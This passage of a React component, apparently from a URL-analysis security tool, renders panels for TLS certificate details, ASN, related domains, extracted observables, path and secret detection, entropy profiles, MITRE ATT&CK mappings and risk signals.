                      <p className="font-mono ba-text-2xs text-muted-foreground">{liveTls.error}</p>
                    ) : (
                      <>
                        <KeyFields items={[
                          { label: "Subject CN", value: String(liveTls.subject_common_name || "—") },
                          { label: "Issuer CN", value: String(liveTls.issuer_common_name || "—") },
                          { label: "Not before", value: String(liveTls.not_before || "—") },
                          { label: "Not after", value: String(liveTls.not_after || "—") },
                          { label: "SAN entries", value: String(liveTls.san_count ?? "—") },
                        ]} />
                        {(() => {
                          const v = typeof liveTls.not_after === "string" ? tlsValidity(liveTls.not_after) : null;
                          if (!v) return null;
                          const tone = v.label === "expired" ? "text-destructive" : v.label === "expiring soon" ? "text-warning" : "text-success";
                          return (
                            <p className={"mt-1.5 font-mono ba-text-2xs " + tone}>
                              {v.label} · {Math.abs(v.days)} day{Math.abs(v.days) === 1 ? "" : "s"} {v.days < 0 ? "ago" : "remaining"} · derived from measured notAfter
                            </p>
                          );
                        })()}
                      </>
                    )}
                  </div>
                )}
                <KeyFields items={analysis.knowledge.certificate.derived.map((r) => ({ label: r.label, value: r.value, tone: r.tone ?? "default" }))} />
                {!liveTls && (
                  <p className="mt-2 text-mono ba-text-2xs text-muted-foreground/70">No live certificate observed — enable backend enrichment (Safe Fetch) to measure the served certificate.</p>
                )}
                {(!liveTls || typeof liveTls.error === "string") && analysis.knowledge.certificate.unavailable.length > 0 && (
                  <ul className="mt-2 space-y-1 border-t border-border/40 pt-2">
                    {analysis.knowledge.certificate.unavailable.map((u, i) => (
                      <li key={i} className="text-mono ba-text-2xs text-muted-foreground/70">{u}</li>
                    ))}
                  </ul>
                )}
              </Panel>
              <Panel title="ASN & Hosting" icon={Database} meta="derived · offline" priority="secondary" collapsible storageKey="ba.panel.url.asn">
                <KeyFields items={analysis.knowledge.asn.map((r) => ({ label: r.label, value: r.value, tone: r.tone ?? "default" }))} />
                <p className="mt-2 text-mono ba-text-2xs text-muted-foreground/70">Live ASN attribution requires opt-in enrichment; values above are locally derivable facts only.</p>
              </Panel>
              <Panel title="Passive DNS" icon={History} meta="placeholder" priority="secondary" collapsible storageKey="ba.panel.url.pdns">
                <p className="text-mono ba-text-2xs text-muted-foreground/80">{analysis.knowledge.passiveDns.note}</p>
              </Panel>
            </div>

            {/* Related Domains */}
            <Panel title="Related Domains" icon={Globe2} meta={`${analysis.knowledge.relatedDomains.length} · derived`} priority="secondary" collapsible storageKey="ba.panel.url.related">
              <div className="flex flex-wrap gap-1.5">
                {analysis.knowledge.relatedDomains.map((d, i) => (
                  <span key={i} title={d.note} className={"inline-flex items-center gap-1.5 rounded border px-2 py-1 text-mono ba-text-sm " + (d.verified ? "border-divider-strong bg-surface-1 text-fg-dim" : "border-warning/30 bg-warning/5 text-warning/90")}>
                    {d.verified ? <CheckCircle2 className="h-3 w-3 text-success" /> : <AlertTriangle className="h-3 w-3" />}
                    <span>{d.value}</span>
                    <span className="text-mono ba-text-3xs text-muted-foreground">{d.note}</span>
                  </span>
                ))}
              </div>
            </Panel>

            {/* Extracted Observables */}
            <Panel title="Extracted Observables" icon={Hash} meta={`${analysis.knowledge.observables.length} · path / query`} priority="secondary" collapsible storageKey="ba.panel.url.observables">
              {analysis.knowledge.observables.length === 0 ? (
                <p className="text-mono ba-text-sm text-muted-foreground">No additional IPs, emails, or hashes in path or query.</p>
              ) : (
                <div className="divide-y divide-border/40">
                  {analysis.knowledge.observables.map((o, i) => (
                    <div key={i} className="flex items-center justify-between gap-2 py-1.5 text-mono ba-text-sm">
                      <div className="flex min-w-0 items-center gap-2">
                        <Chip>{o.kind === "hash" ? classifyHashLabel(o.value) : o.kind.toUpperCase()}</Chip>
                        <code className="truncate text-fg-dim">{o.value}</code>
                        <span className="shrink-0 text-mono ba-text-3xs text-muted-foreground">{o.source}</span>
                      </div>
                      <div className="flex shrink-0 items-center gap-1">
                        <button onClick={() => copyText(o.value)} className="rounded border border-divider-soft bg-surface-1 px-1.5 py-0.5 text-mono ba-text-3xs text-muted-foreground hover:text-primary">copy</button>
                        <button onClick={() => locker.add({ value: o.value, type: o.kind === "hash" ? guessType(o.value) : o.kind, source: "/url" })} className="rounded border border-divider-soft bg-surface-1 px-1.5 py-0.5 text-mono ba-text-3xs text-muted-foreground hover:text-primary">locker</button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </Panel>

            {/* Related Entities */}
            <Panel title="Related Entities" icon={CornerDownRight} meta="graph candidates" priority="secondary" collapsible storageKey="ba.panel.url.entities">
              <KeyFields items={analysis.knowledge.relatedEntities.map((r) => ({ label: r.label, value: r.value, tone: r.tone ?? "default" }))} />
            </Panel>

            {/* Path Analysis */}
            <Panel title="Path Analysis" icon={CornerDownRight} meta={`${analysis.pathSignals.length} signal${analysis.pathSignals.length === 1 ? "" : "s"}`}>
              <div className="space-y-3">
                {analysis.pathSignals.length === 0 ? (
                  <p className="text-mono ba-text-sm text-muted-foreground">No suspicious path patterns detected.</p>
                ) : (
                  <ul className="space-y-1.5">
                    {analysis.pathSignals.map((s, i) => {
                      const sev = s.startsWith("File download") || s.startsWith("Suspicious TLD") ? "warning" :
                                  s.startsWith("Path traversal") || s.startsWith("Embedded") ? "destructive" : "info";
                      return (
                        <li key={i} className="flex items-center gap-2 text-mono ba-text-sm">
                          <span className={`inline-block h-1.5 w-1.5 shrink-0 rounded-full ${
                            sev === "destructive" ? "bg-destructive" : sev === "warning" ? "bg-warning" : "bg-primary"
                          }`} />
                          <span className="text-fg-dim">{s}</span>
                        </li>
                      );
                    })}
                  </ul>
                )}
                {analysis.suspiciousPaths.length > 0 && (
                  <div className="flex flex-wrap gap-1">
                    {analysis.suspiciousPaths.map((p, i) => (
                      <Chip key={i}>{p}</Chip>
                    ))}
                  </div>
                )}
                {analysis.fileExt && (
                  <div className="rounded border border-subtle bg-surface-1 px-2 py-1.5 text-mono ba-text-sm">
                    <span className="text-muted-foreground">File extension: </span>
                    <span className="font-semibold text-warning">.{analysis.fileExt}</span>
                  </div>
                )}
              </div>
            </Panel>

            {/* Domain Profile + Secrets grid */}
            <div className="grid gap-3 grid-cols-2">
              <Panel title="Domain Profile" icon={Globe2} meta={`entropy ${analysis.domainEnt.toFixed(2)}`} priority="secondary" collapsible storageKey="ba.panel.url.domain" defaultCollapsed>
                <KeyFields items={[
                  { label: "TLD", value: `.${analysis.tld}`, tone: analysis.isSuspiciousTLD ? "warning" : "default" },
                  { label: "Domain entropy", value: analysis.domainEnt.toFixed(2), tone: analysis.domainEnt > 4.0 ? "warning" : "default" },
                  { label: "Numeric IP", value: analysis.isNumericDomain ? "yes" : "no", tone: analysis.isNumericDomain ? "warning" : "default" },
                  { label: "Unicode in path", value: analysis.suspiciousChars.filter((c) => c.char !== "@" && c.char !== "%25").length > 0 ? "yes" : "no", tone: "primary" },
                ]} />
                {analysis.suspiciousChars.length > 0 && (
                  <div className="mt-2">
                    <p className="mb-1 text-mono ba-text-2xs text-muted-foreground">Suspicious characters</p>
                    <div className="flex flex-wrap gap-1">
                      {analysis.suspiciousChars.map((c, i) => (
                        <Chip key={i}>{`'${c.char}' at ${c.pos}`}</Chip>
                      ))}
                    </div>
                  </div>
                )}
                {analysis.hasNonStandardPort && (
                  <p className="mt-2 rounded border border-warning/30 bg-warning/5 px-2 py-1 text-mono ba-text-2xs text-warning">
                    Port {analysis.portNum}: {analysis.portReason || "non-standard port"}
                  </p>
                )}
              </Panel>

              <Panel title="Secrets in URL" icon={Key} meta={`${analysis.secrets.length}`} priority="secondary" collapsible storageKey="ba.panel.url.secrets">
                {analysis.secrets.length === 0 ? (
                  <p className="text-mono ba-text-sm text-muted-foreground">No secrets detected in URL path or query.</p>
                ) : (
                  <ul className="space-y-1.5">
                    {analysis.secrets.map((s, i) => (
                      <li key={i} className="flex items-center gap-2 text-mono ba-text-sm">
                        <span className="inline-block h-1.5 w-1.5 shrink-0 rounded-full bg-destructive" />
                        <span className="font-semibold text-destructive">{s.type}:</span>
                        <code className="text-fg-dim">{s.value}</code>
                      </li>
                    ))}
                  </ul>
                )}
              </Panel>
            </div>

            {/* Query Params + String Profile */}
            {(() => {
              const params = Array.from(analysis.parsed!.searchParams.entries());
              const href = analysis.parsed!.href;
              const hrefEnt = (() => {
                const m: Record<string, number> = {};
                for (const c of href) m[c] = (m[c] ?? 0) + 1;
                let e = 0; for (const k in m) { const p = m[k] / href.length; e -= p * Math.log2(p); }
                return Math.round(e * 100) / 100;
              })();
              const lenPct = Math.min(100, Math.round((href.length / 200) * 100));
              const entPct = Math.min(100, Math.round((hrefEnt / 6) * 100));
              return (
                <div className="grid gap-3 grid-cols-2">
                  <Panel title="Query Parameters" meta={`${params.length}`} priority="secondary">
                    {params.length === 0 ? (
                      <p className="text-mono ba-text-sm text-muted-foreground">No query string.</p>
                    ) : (
                      <ul className="divide-y divide-border/40">
                        {params.map(([k, v], i) => (
                          <li key={i} className="grid grid-cols-[120px_1fr] items-start gap-2 py-1.5 text-mono ba-text-sm">
                            <code className="truncate text-primary/90">{k}</code>
                            <code className="truncate text-fg-dim">{v || "—"}</code>
                          </li>
                        ))}
                      </ul>
                    )}
                  </Panel>
                  <Panel title="String Profile" meta="length · entropy" priority="secondary">
                    <div className="space-y-3">
                      <div>
                        <div className="mb-1 flex items-center justify-between text-mono ba-text-2xs text-muted-foreground">
                          <span>Length</span><span className="text-foreground">{href.length} chars</span>
                        </div>
                        <div className="h-1.5 rounded-full bg-surface-2 overflow-hidden">
                          <div className={"h-full transition-all " + (lenPct > 70 ? "bg-warning" : "bg-primary")} style={{ width: `${lenPct}%` }} />
                        </div>
                      </div>
                      <div>
                        <div className="mb-1 flex items-center justify-between text-mono ba-text-2xs text-muted-foreground">
                          <span>Shannon entropy</span><span className="text-foreground">{hrefEnt} bits</span>
                        </div>
                        <div className="h-1.5 rounded-full bg-surface-2 overflow-hidden">
                          <div className={"h-full transition-all " + (entPct > 70 ? "bg-destructive" : entPct > 50 ? "bg-warning" : "bg-success")} style={{ width: `${entPct}%` }} />
                        </div>
                      </div>
                      <p className="text-mono ba-text-2xs text-muted-foreground">High entropy + long path often signals encoded payloads or session tokens.</p>
                    </div>
                  </Panel>
                </div>
              );
            })()}

            {/* IOC Summary */}
            <Panel title="Artifact Summary" icon={Hash} meta="url · domain · ip">
              <div className="space-y-2">
                {[{label:"URL", value: defang(analysis.parsed.href)}, {label:"Domain", value: analysis.parsed.hostname}, {label:"Registrable", value: analysis.parsed.hostname.split(".").slice(-2).join(".")}].map(item => (
                  <div key={item.label} className="flex items-center justify-between gap-2 rounded border border-divider-soft bg-surface-1 px-2 py-1">
                    <div className="flex items-center gap-2 min-w-0">
                      <span className="shrink-0 text-mono ba-text-2xs text-muted-foreground">{item.label}</span>
                      <code className="truncate text-mono ba-text-sm text-foreground">{item.value}</code>
                    </div>
                    <div className="flex items-center gap-1 shrink-0">
                      <button onClick={() => { copyText(item.value); }} className="rounded border border-divider-soft bg-surface-1 px-1.5 py-0.5 text-mono ba-text-3xs text-muted-foreground hover:text-primary">copy</button>
                      <button onClick={() => { locker.add({ value: item.value, type: item.label === "URL" ? "url" : "domain", source: "/url" }); }} className="rounded border border-divider-soft bg-surface-1 px-1.5 py-0.5 text-mono ba-text-3xs text-muted-foreground hover:text-primary">locker</button>
                    </div>
                  </div>
                ))}
              </div>
            </Panel>

            {renderEnrichment(er)}

            {/* MITRE ATT&CK */}
            {analysis.mitre.length > 0 && (
              <Panel title="MITRE ATT&CK Mapping" icon={Crosshair} meta={`${analysis.mitre.length} technique${analysis.mitre.length === 1 ? "" : "s"}`} priority="secondary">
                <div className="flex flex-wrap gap-2">
                  {analysis.mitre.map((m, i) => (
                    <span key={i} className="inline-flex items-center gap-1.5 rounded border border-divider-strong bg-surface-1 px-2 py-1 text-mono ba-text-sm text-fg-dim">
                      <Bug className="h-3 w-3 text-destructive" />
                      <span className="font-semibold">{m.id}</span>
                      <span className="text-muted-foreground">:</span>
                      <span>{m.name}</span>
                    </span>
                  ))}
                </div>
              </Panel>
            )}

            {/* Risk Signals */}
            <SectionBar id="EV" label="Risk signals" meta={`${analysis.displayFindings.length + measuredRedirects.length} · reason · action`} priority="secondary" />
            <div className="grid gap-3 grid-cols-2">
              {analysis.displayFindings.length === 0 && measuredRedirects.length === 0 ? <Empty title="No suspicious patterns" hint="URL Analyzer extracts IOCs, detects phishing indicators (typosquatting, defanged URLs), and traces redirect chains. Try a different URL or check the parsed components below." /> : analysis.displayFindings.map((f, i) => (
                <EvidenceCard key={i} severity={f.severity} title={f.title} reason={f.reason} action={f.action} limitation="Heuristic — verify with passive DNS / TLS / WHOIS." />
              ))}
              {measuredRedirects.map((f, i) => (
                <EvidenceCard key={`m-${i}`} severity={f.severity} title={f.title} reason={f.reason} action={f.action} limitation="Measured via opt-in Safe Fetch — header metadata only, page not rendered." />
              ))}
            </div>

            {/* Parsed URL */}
            <Panel title="Parsed URL" icon={Link2} meta="components">
              <KeyFields items={[
                { label: "Scheme", value: analysis.parsed.protocol.replace(":", "") },
                ...(analysis.parsed.hostname ? [{ label: "Host", value: analysis.parsed.hostname }] : []),
                ...(analysis.parsed.port ? [{ label: "Port", value: analysis.parsed.port }] : []),
                ...(analysis.parsed.pathname ? [{ label: "Path", value: analysis.parsed.pathname }] : []),
                ...(analysis.parsed.search ? [{ label: "Query", value: analysis.parsed.search }] : []),
                ...(analysis.parsed.hash ? [{ label: "Fragment", value: analysis.parsed.hash }] : []),
                ...(analysis.parsed.username ? [{ label: "Username", value: analysis.parsed.username }] : []),
                ...(analysis.parsed.password ? [{ label: "Password", value: analysis.parsed.password }] : []),
              ]} />
            </Panel>
          </>}
      </AnalyzerShell>
    </PageShell>
    </ErrorBoundary>
  );
}
